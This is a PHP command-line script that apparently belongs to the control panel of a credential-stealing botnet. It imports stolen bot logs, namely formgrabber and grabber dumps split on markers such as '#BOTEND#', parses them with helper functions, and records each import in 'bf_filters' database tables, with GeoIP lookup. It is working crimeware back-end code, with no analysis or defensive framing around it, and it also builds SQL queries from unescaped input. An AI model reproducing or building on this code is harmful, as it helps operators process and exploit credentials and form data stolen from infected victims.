#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '256M');

function real_path($p){
	$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
	if(empty($r)){
		mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
		$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
	}
	return $r;
}

function exits(){
	global $MYPID, $dir, $socket;
	if(empty($MYPID)){
		if($socket != false) fclose($socket);
	}else{
		@unlink($dir['site'] . 'cache/imports/pids/' . $MYPID);
	}
	exit;
}

if(file_exists('../../cache/imports/dirs.json')) $dir = json_decode(file_get_contents('../../cache/imports/dirs.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs']) || empty($dir['pids']) || empty( $dir['u']['5']) || empty($dir['u']['6']) || empty($dir['s']['5']) || empty($dir['s']['6'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	$dir['pids'] = real_path($dir['site'] . 'cache/imports/pids/');
	$dir['proc'] = real_path($dir['site'] . 'cache/imports/proc/');
    $dir['l']['5'] = real_path($dir['logs'] . 'export/fgr/');
	$dir['l']['6'] = real_path($dir['logs'] . 'export/gra/');
	$dir['l']['7'] = real_path($dir['logs'] . 'export/sni/');
    $dir['u']['5'] = real_path($dir['logs'] . 'save_sort/fgr/');
	$dir['u']['6'] = real_path($dir['logs'] . 'save_sort/gra/');
	$dir['s']['5'] = real_path($dir['logs'] . 'save_logs/fgr/');
	$dir['s']['6'] = real_path($dir['logs'] . 'save_logs/gra/');
	file_put_contents($dir['site'] . 'cache/imports/dirs.json', json_encode($dir));
}

$MYPID = getmypid();
if(empty($MYPID)){
	do{
		$port = mt_rand(10000, 65000);
		$socket = @stream_socket_server('tcp://127.0.0.1:' . $port, $errno, $errstr);
		if($socket != false) file_put_contents($dir['site'] . 'cache/imports/pids/' . $port, 'socket');
		unset($port);
	}while(!$socket);
}else{
	file_put_contents($dir['site'] . 'cache/imports/pids/' . $MYPID, 'pid');
}

ini_set('error_log', $dir['site'] . 'cache/imports/import_file_errors_php.txt');
function error_file_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8) file_put_contents($dir['site'] . 'cache/imports/import_file_errors_php.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_file_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	//exec($dir['script'] . 'pv.exe -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

$id = $_SERVER['argv'][1];
$unnecessary = $_SERVER['argv'][2] == 1 ? true : false;

if($unnecessary != false){
	if(file_exists($dir['pids'] . $id . '-1')) unlink($dir['pids'] . $id . '-1');
}else{
	if(file_exists($dir['pids'] . $id . '-0')) unlink($dir['pids'] . $id . '-0');
}

if(empty($id)){
	error_log('EMPTY_ID!',4);
	exits();
}

if(file_exists($dir['site'] . 'cache/imports/pids/' . $id . $unnecessary)) unlink($dir['site'] . 'cache/imports/pids/' . $id . $unnecessary);

include_once($dir['site'] . 'includes/functions.get_config.php');
include_once($dir['site'] . 'includes/functions.get_host.php');
include_once($dir['site'] . 'includes/functions.create_filter.php');
include_once($dir['site'] . 'includes/functions.load_filters.php');

$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exits();
}

if($unnecessary != true){
	$task = $mysqli->query('SELECT id, file, type FROM bf_filters_files WHERE (id = \''.$id.'\') LIMIT 1');
}else{
	//$task = $mysqli->query('SELECT id, file, type FROM bf_filters_unnecessary WHERE (id = \''.$id.'\') LIMIT 1');
}

if($task->id != $id)  exits();
if($task->type != '5' && $task->type != '6' && $task->type != '7') exits();

if($unnecessary != true){
	$task->dl = $dir['l'][$task->type];
	$task->unnecessary = false;
}else{
	$task->dl = $dir['u'][$task->type];
	$task->unnecessary = true;
}

if(!file_exists($task->dl . $task->file)){
	if($task->unnecessary != true){
		$mysqli->query('delete from bf_filters_files where (id = \''.$task->id.'\')');
	}else{
		//$mysqli->query('delete from bf_filters_unnecessary where (id = \''.$task->id.'\')');
	}
	error_log('FILE_NOT_FOUND ' . $task->dl . $task->file,4);
	exits();
}

if(file_exists($dir['site'] . 'cache/imports/filters.json')){
	$filters = json_decode(file_get_contents($dir['site'] . 'cache/imports/filters.json'), true);
}else{
	$filters = array();
	$mysqli->query('SHOW TABLE STATUS', null, 'load_flist');
	$mysqli->query('SELECT id, fields, host, save_log FROM bf_filters WHERE host IS NOT NULL', null, 'load_filters');
	file_put_contents($dir['site'] . 'cache/imports/filters.json', json_encode($filters));
}

if(!function_exists('geoip_country_code_by_name')){
	$geoip_ex = true;
	if(file_exists($dir['site'] . '/cache/geoip/')){
		require_once($dir['site'] . '/cache/geoip/geoip.inc');
		$gi = geoip_open($dir['site'] . '/cache/geoip/GeoIP.dat', GEOIP_STANDARD);
	}
}else{
	$geoip_ex = false;
}

$ml = ini_get('memory_limit');
$ml = str_replace('M', '', $ml);
$ml = ($ml * 1024 * 1024);

switch($task->type){
	case 5: // formgrabber
		include_once($dir['site'] . 'includes/functions.get_formgrabber.php');
		$fs = filesize($task->dl . $task->file);
     	if($fs > ($ml / 4)){
     		//$block_size = 10240;
     		$block_size = $ml / 8;
     		$fs_max = ($fs + $block_size);
     		$cb = $h = 0;
     		if($task->unnecessary != true){
     			$separator = "[~]";
			}else{
				$separator = "[~]\r\n\r\n";
			}

     		$log = '';

     		do{
     			$log .= file_get_contents($task->dl . $task->file, false, null, $cb, $block_size);
     			$h = strrpos($log, $separator);

     			if($h !== false){
     				$h += strlen($separator);
     				file_put_contents($dir['proc'] . $task->id, $fs . '|' . $cb);
     				get_formgrabber(substr($log, 0, $h));
     				$cb += $h;
     				$log = '';
     			}else{
     				$cb += $block_size;
     			}
     		}while($cb < $fs_max);
        }else{
        	$cb = $fs;
        	file_put_contents($dir['proc'] . $task->id, $fs . '|' . $cb);
        	get_formgrabber(file_get_contents($task->dl . $task->file));
     	}
	break;

	case 6: // grabber
     	include_once($dir['site'] . 'includes/functions.get_grabber.php');
     	$fs = filesize($task->dl . $task->file);
     	if($fs > ($ml / 4)){
     		$block_size = $ml / 8;
     		$fs_max = ($fs + $block_size);
     		$cb = $h = 0;
     		$ab = $fs / $block_size;
     		$separator = "#BOTEND#\r\n";
     		$log = '';

     		do{
     			$log .= file_get_contents($task->dl . $task->file, false, null, $cb, $block_size);
     			$h = strrpos($log, $separator);

     			if($h !== false){
     				$h += strlen($separator);
     				file_put_contents($dir['site'] . 'cache/proc/' . $task->id, $fs . '|' . $cb);
     				get_grabber(substr($log, 0, $h));
     				$cb += $h;
     				$log = '';
     			}else{
     				$cb += $block_size;
     			}
     		}while($cb < $fs_max);
        }else{
        	$cb = $fs;
        	file_put_contents($dir['site'] . 'cache/proc/' . $task->id, $fs . '|' . $cb);
        	get_grabber(file_get_contents($task->dl . $task->file));
     	}
	break;

	case 7: // sniffer
		//include_once($dir['site'] . 'includes/functions.get_sniffer.php');
		//get_sniffer(file_get_contents($task->dl . $task->file));
	break;
}

if($task->unnecessary != true){
	$mysqli->query('update bf_filters_files set import = \'1\' WHERE (id = \''.$task->id.'\') LIMIT 1');
}else{
	//$mysqli->query('delete from bf_filters_unnecessary where (id = \''.$task->id.'\') LIMIT 1');
	@unlink($task->dl . $task->file);
}

if($geoip_ex == true){
	if(file_exists($dir['site'] . '/cache/geoip/')){
		geoip_close($gi);
		unset($gi);
	}
}

if(file_exists($dir['proc'] . $task->id)) unlink($dir['proc'] . $task->id);

if(empty($MYPID)){
	if($socket != false) fclose($socket);
}else{
	if(file_exists($dir['pids'] . $MYPID))@unlink($dir['pids'] . $MYPID);
}

if($unnecessary != false){
	if(file_exists($dir['pids'] . $id . '-1')) unlink($dir['pids'] . $id . '-1');
}else{
	if(file_exists($dir['pids'] . $id . '-0')) unlink($dir['pids'] . $id . '-0');
}

exits();

?>